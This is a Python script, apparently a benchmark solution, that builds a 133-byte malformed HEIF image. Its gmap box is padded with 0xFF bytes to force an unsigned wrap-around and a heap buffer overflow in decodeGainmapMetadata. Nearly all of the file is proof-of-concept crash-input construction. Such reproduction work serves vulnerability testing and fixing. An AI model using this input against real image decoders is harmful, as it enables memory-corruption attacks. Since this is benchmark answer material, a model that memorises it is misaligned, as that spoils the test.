import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The goal is to generate a PoC for a Heap Buffer Overflow in decodeGainmapMetadata.
        # The ground truth length is 133 bytes.
        # We construct a minimal HEIF file containing:
        # - ftyp box (20 bytes)
        # - meta box (containing hdlr and iprp)
        # - iprp -> ipco -> gmap box
        #
        # Calculated structure for exactly 133 bytes:
        # ftyp: 20 bytes
        # meta: 113 bytes (header 8 + content 105)
        #   FullBox overhead: 4 bytes
        #   hdlr: 33 bytes (header 8 + content 25)
        #   iprp: 68 bytes (header 8 + content 60)
        #     ipco: 60 bytes (header 8 + content 52)
        #       gmap: 52 bytes (header 8 + content 44)
        #         FullBox overhead: 4 bytes
        #         Payload: 40 bytes (filled with 0xFF to trigger overflow)
        
        # 1. ftyp
        # Brand 'mif1', version 0, compatible 'mif1', 'heic'
        ftyp_data = b'mif1' + b'\x00\x00\x00\x00' + b'mif1' + b'heic'
        ftyp = struct.pack('>I', len(ftyp_data) + 8) + b'ftyp' + ftyp_data
        
        # 2. hdlr
        # FullBox (v0, f0)
        # Pre-defined: 0
        # Handler: 'pict'
        # Reserved: 0 (12 bytes)
        # Name: '\0' (1 byte)
        hdlr_content = (
            b'\x00\x00\x00\x00' +       # Version/Flags
            b'\x00\x00\x00\x00' +       # Pre-defined
            b'pict' +                   # Handler Type
            b'\x00' * 12 +              # Reserved
            b'\x00'                     # Name
        )
        hdlr = struct.pack('>I', len(hdlr_content) + 8) + b'hdlr' + hdlr_content
        
        # 3. gmap (Vulnerable Box)
        # Assuming gmap is a FullBox.
        # We use a payload of 0xFF to trigger "subtraction between unsigned types" wrap-around.
        gmap_payload = b'\x00\x00\x00\x00' + b'\xFF' * 40
        gmap = struct.pack('>I', len(gmap_payload) + 8) + b'gmap' + gmap_payload
        
        # 4. ipco
        ipco_content = gmap
        ipco = struct.pack('>I', len(ipco_content) + 8) + b'ipco' + ipco_content
        
        # 5. iprp
        iprp_content = ipco
        iprp = struct.pack('>I', len(iprp_content) + 8) + b'iprp' + iprp_content
        
        # 6. meta
        # FullBox (v0, f0)
        meta_content = b'\x00\x00\x00\x00' + hdlr + iprp
        meta = struct.pack('>I', len(meta_content) + 8) + b'meta' + meta_content
        
        return ftyp + meta
